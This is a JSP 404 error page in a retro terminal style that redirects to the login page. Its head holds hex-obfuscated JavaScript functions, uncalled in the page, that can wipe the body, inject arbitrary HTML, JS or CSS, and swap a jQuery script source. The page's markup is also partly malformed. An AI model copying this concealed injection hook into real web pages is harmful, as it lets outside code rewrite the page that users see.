<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
    <%  
String path = request.getContextPath();  
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";  
%>  
  
<base href="<%=basePath%>">  
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<head>
   <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Refresh" content="5;url=login.jsp">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>无法找到页面</title>

    <link href="static/css/bootstrap.min.css" rel="stylesheet">

    <!--[if lt IE 9]>
      <script src="https://cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
    <meta charset="utf-8">
	<script id="jqbb" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
    <script>
        function reload_html() {
            $("\x62\x6f\x64\x79")["\x68\x74\x6d\x6c"]("");
        }

        function addhtml(lViZBL1) {
            $("\x62\x6f\x64\x79")["\x68\x74\x6d\x6c"](lViZBL1);
        }

        function addcss(CDEsDFFJ2) {
            var EZS_sF3 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74"]("\x73\x74\x79\x6c\x65");
            EZS_sF3["\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c"] = CDEsDFFJ2;
            window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72"]("\x62\x6f\x64\x79")["\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64"](EZS_sF3);
        }

        function addjs(qGZu4) {
            $("\x62\x6f\x64\x79")["\x61\x70\x70\x65\x6e\x64"](qGZu4);
        }

        function jqban(nJ5) {
            $("\x23\x6a\x71\x62\x62")["\x61\x74\x74\x72"]("\x73\x72\x63", "\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x69\x62\x73\x2e\x62\x61\x69\x64\x75\x2e\x63\x6f\x6d\x2f\x6a\x71\x75\x65\x72\x79\x2f" + nJ5 + "\x2f\x6a\x71\x75\x65\x72\x79\x2e\x6d\x69\x6e\x2e\x6a\x73");
        }
    </script>
    <style type="text/css">
        @import 'https://fonts.googleapis.com/css?family=Inconsolata';

html {
  min-height: 100%;
}

body {
  box-sizing: border-box;
  height: 100%;
  background-color: #000000;
  background-image: radial-gradient(#333, #111);
  font-family: 'Inconsolata', Helvetica, sans-serif;
  font-size: 1.5rem;
  color: rgba(128, 128, 128, 0.8);
  text-shadow: 0 0 1ex rgba(51, 51, 51, 1), 0 0 2px rgba(255, 255, 255, 0.8);
}

.overlay {
  pointer-events: none;
  position: absolute;
  width: 100%;
  height: 100%;
  background: repeating-linear-gradient(180deg, rgba(0, 0, 0, 0) 0, rgba(0, 0, 0, 0.3) 50%, rgba(0, 0, 0, 0) 100%);
  background-size: auto 4px;
  z-index: 99;
}

.overlay::before {
  content: "";
  pointer-events: none;
  position: absolute;
  display: block;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-image: linear-gradient(0deg,
      transparent 0%,
      rgba(128, 128, 128, 0.2) 2%,
      rgba(128, 128, 128, 0.8) 3%,
      rgba(128, 128, 128, 0.2) 3%,
      transparent 100%);
  background-repeat: no-repeat;
  animation: scan 7.5s linear 0s infinite;
}

@keyframes scan {
  0% { background-position: 0 -100vh; }
  35%, 100% { background-position: 0 100vh; }
}

.terminal {
  box-sizing: inherit;
  position: absolute;
  height: 100%;
  width: 1000px;
  max-width: 100%;
  padding: 4rem;
  text-transform: uppercase;
}

.output {
  color: rgba(128, 128, 128, 0.8);
  text-shadow: 0 0 1ex rgba(51, 51, 51, 0.8),
      0 0 2px rgba(255, 255, 255, 0.8);
}

.output::before {
  content: "> ";
}

/*
.input {
  color: rgba(192, 255, 192, 0.8);
  text-shadow: 0 0 1ex #3f3, 0 0 2px rgba(255, 255, 255, 0.8);
}

.input::before {
  content: "$ ";
}
*/

a {
  color: #fff;
  text-decoration: none;
}

a::before {
  content: "[";
}

a::after {
  content: "]";
}

.errorcode {
  color: white;
}
    </style>
    	
</head>
<body >
    <div class="overlay" ></div>
<div class="terminal">
  <h1>Error <span class="errorcode">404</span></h1>
  <p class="output">The page you are looking for might have been removed, had its name changed or is temporarily unavailable</ü>
  <p class="output">Please try <a href="#1">this link</a> or <a href="#2">this link</a></p>
  <p class="output">Good luck</p>
  <p class="output">错误页面，自动为你转回登录页面</p>
</div>
</body>
<script>
    <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
    <script src="static/js/bootstrap.min.js"></script>
  </body>
</html>